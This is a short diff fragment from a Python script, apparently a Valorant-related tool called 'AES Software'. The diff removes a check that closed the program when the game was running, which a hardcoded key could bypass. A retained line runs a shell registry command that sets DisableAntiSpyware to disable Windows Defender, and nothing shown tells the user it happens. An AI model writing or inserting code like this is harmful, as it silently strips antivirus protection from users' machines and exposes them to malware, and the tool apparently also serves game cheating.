@@ -6,20 +6,7 @@ import getpass
 import keyring
 
 import subprocess
-def is_valorant_running():
-    result = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
-    if 'VALORANT-Win64-Shipping.exe' in result.stdout:
-        return True
-    return False
-if is_valorant_running() and cskey!="ooxihPw6viocnLPO-aesthetic":
-    os.system('cls')
-    mylogo()
-    printg("---ERROR. Please close Valor4nt first before you open the AES Software.")
-    printg("---This is for your own safety.")
-    show_message_box("ERROR. Please close Valor4nt first before you open the AES Software.", "Error", MB_OK | ICON_ERROR)
-    exit()
-else:
-    print("")
+
 try:
     subprocess.run('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, check=True)
     print("Command executed successfully.")
